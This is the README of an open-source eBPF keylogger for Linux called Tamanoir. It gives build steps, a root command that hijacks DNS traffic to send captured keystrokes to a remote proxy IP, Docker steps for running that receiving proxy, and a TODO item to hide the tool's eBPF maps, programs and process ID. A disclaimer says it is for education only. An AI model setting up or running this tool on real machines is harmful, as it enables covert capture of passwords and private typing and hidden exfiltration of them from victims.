<div align="center">
  <h1> Tamanoir <br> A KeyLogger using eBPF </h1>
  <img src="https://github.com/user-attachments/assets/47b8a0ef-6a52-4e2d-8188-e77bb9e98d79" style="width: 40%; height: 40%"</img>
</div>

## 💡Overview

<div align="center">
  <img src="https://github.com/user-attachments/assets/24f80020-9d60-4f2a-825b-ed56574dfb24" </img>
</div>

<br>

## 🚀 Setup

### Tamanoir

You need a Linux based OS.

##### ⚒️ Build from source

To build from source, make sure you have:

- [bpf-linker](https://github.com/aya-rs/bpf-linker) installed.
- [Rust](https://www.rust-lang.org/tools/install) installed with `nightly` toolchain.

1. Build ebpf program

```
cd tamanoir-ebpf
cargo build --release
```

2. Build user space program

```
cargo build --release
```

This will produce an executable file at `target/release/tamanoir` that you can copy to a directory in your `$PATH`

##### 📥 Binary release

You can download the pre-built binaries from the [release page](https://github.com/pythops/tamanoir/releases)

#### 🪄 Usage

2. Run

```
RUST_LOG=info sudo -E tamanoir \
              --proxy-ip <DNS proxy IP> \
              --hijack_ip <locally configured DNS server IP> \
              --layout <keyboard layout>
```

for example:

```
RUST_LOG=info sudo -E tamanoir \
              --proxy-ip 192.168.1.75 \
              --hijack_ip 8.8.8.8 \
              --layout 0
```

Currenly, there are two supported keyboard layouts:

`0` : qwerty (us)

`1` : azerty (fr)

---

### DNS Proxy

On a remote host, make sure you have [docker](https://docs.docker.com/engine/install/) installed.

#### 1. Build proxy image

```
cd proxy
docker build -t proxy .
```

#### 2. Run proxy

> [!NOTE]
> Make sure port 53 is available

```
docker run --rm -it -p 53:53/udp -e PAYLOAD_LEN=8 proxy
```

<br>

## 🛠️TODO

- [ ] Automatic discovery of the configured local dns server
- [ ] Automatic discovery of the keyboard layout
- [ ] Rewrite the DNS proxy in Rust
- [ ] Make `Tamanoir` stealth (hide used ebpf maps and programs, process pid ...)

<br>

## ⚠️ Disclaimer

`Tamanoir` is developed for educational purposes only

<br>

## ✍️ Authors

[Badr Badri](https://github.com/pythops)

[Adrien Gaultier](https://github.com/adgaultier)

<br>

## ⚖️ License

GPLv3
